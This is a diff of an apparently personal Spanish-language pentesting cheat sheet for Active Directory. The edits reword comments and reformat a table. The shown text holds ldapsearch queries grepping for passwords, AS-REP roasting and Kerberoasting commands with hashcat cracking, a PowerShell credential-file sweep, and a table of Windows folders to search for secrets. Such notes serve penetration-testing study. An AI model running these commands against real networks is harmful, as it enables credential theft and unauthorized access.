@@ -22,7 +22,7 @@
 	ldapsearch -x -H ldap://dc01 -b "dc=domain,dc=com"
 	# o para búsqueda de información sensible
 	ldapsearch -x -H ldap://dc01 -b "dc=example,dc=local" '(objectClass=*)' | grep -iE 'pass|pwd|description|comment|info'
-	# ejemplo proporcionando credenciales y buscando usuarios con logon script -> scritp que se ejecuta al iniciar sesión
+	# ejemplo proporcionando credenciales y buscando usuarios con logon script -> buscar scritps que se ejecutan al iniciar sesión
 	ldapsearch -h $target -D "CN=user,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local" "(scriptPath=*)" sAMAccountName scriptPath
 	```
 - `windapsearch` - menos técnico 
@@ -36,7 +36,7 @@
 	```bash
 	impacket-GetNPUsers -dc-ip $dcip -request -outputfile hash_asreproast $domain/$username:$password
 	```
-- Obtener hashes y crackear (ej. con hashcat).
+- Obtenemos hash `Kerberos AS-REP (etype 23)`.  Craqueamos con:
 	```bash
 	hashcat -m 18200 hash_asreproast /usr/share/wordlists/rockyou.txt 
 	```
@@ -49,7 +49,7 @@
 	```bash
 	impacket-GetUserSPNs -dc-ip $dcip $domain/$username -request -outputfile hash_kerberoast
 	```
-- Crackear hash para obtener contraseñas.
+- Obtener hash `Kerberos TGS-REP (etype 23)`. Craqueamos:
 	```
 	hashcat -m 13100 hash_kerberoast /usr/share/wordlists/rockyou.txt
 	```
@@ -365,17 +365,17 @@ Get-ChildItem -Path "C:\Users\*", "C:\Scripts", "C:\Backups", "C:\Temp", "C:\Pro
 (Get-ChildItem -Path "C:\Users\*", "C:\Scripts", "C:\Backups", "C:\Temp", "C:\ProgramData", "C:\inetpub\wwwroot" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 0 }) | Select-String -Pattern "password|secret|token|key|creds" -SimpleMatch | Select-Object Path, LineNumber, Line
 ```
 
-|Carpeta|Qué buscar|
-|---|---|
-|`C:\Users\*\Desktop`|Notas, scripts de admins, contraseñas en texto plano|
-|`C:\Users\*\Documents`|PDFs, DOCX, credenciales, backups|
-|`C:\Users\*\Downloads`|Instaladores, herramientas usadas por el usuario|
-|`C:\Users\*\AppData\Local\Temp`|Temporales con volcados o archivos sensibles|
-|`C:\Program Files` / `Program Files (x86)`|Software mal configurado, rutas modificables, binarios inseguros|
-|`C:\ProgramData`|Configuraciones globales, archivos compartidos|
-|`C:\Temp`|Archivos temporales personalizados, muy común en entornos dev|
-|`C:\inetpub\wwwroot`|Código fuente de aplicaciones web, bases de datos, credenciales hardcoded|
-|`C:\Windows\Tasks` / `System32\Tasks`|Tareas programadas, ejecución automática como SYSTEM|
-|`C:\Backups`, `C:\Scripts`|Carpeta común para volcados de seguridad y automatizaciones|
-|`C:\Recycle.Bin` o Papelera|Archivos borrados que pueden contener datos útiles|
-|Carpetas compartidas (`\\`)|Información accesible vía SMB; usar `net view`, `net use`, `SharpHound`|
+| Carpeta                                    | Qué buscar                                                                |
+| ------------------------------------------ | ------------------------------------------------------------------------- |
+| `C:\Users\*\Desktop`                       | Notas, scripts de admins, contraseñas en texto plano                      |
+| `C:\Users\*\Documents`                     | PDFs, DOCX, credenciales, backups                                         |
+| `C:\Users\*\Downloads`                     | Instaladores, herramientas usadas por el usuario                          |
+| `C:\Users\*\AppData\Local\Temp`            | Temporales con volcados o archivos sensibles                              |
+| `C:\Program Files` / `Program Files (x86)` | Software mal configurado, rutas modificables, binarios inseguros          |
+| `C:\ProgramData`                           | Configuraciones globales, archivos compartidos                            |
+| `C:\Temp`                                  | Archivos temporales personalizados, muy común en entornos dev             |
+| `C:\inetpub\wwwroot`                       | Código fuente de aplicaciones web, bases de datos, credenciales hardcoded |
+| `C:\Windows\Tasks` / `System32\Tasks`      | Tareas programadas, ejecución automática como SYSTEM                      |
+| `C:\Backups`, `C:\Scripts`                 | Carpeta común para volcados de seguridad y automatizaciones               |
+| `C:\Recycle.Bin` o Papelera                | Archivos borrados que pueden contener datos útiles                        |
+| Carpetas compartidas (`\\`)                | Información accesible vía SMB; usar `net view`, `net use`, `SharpHound`   |
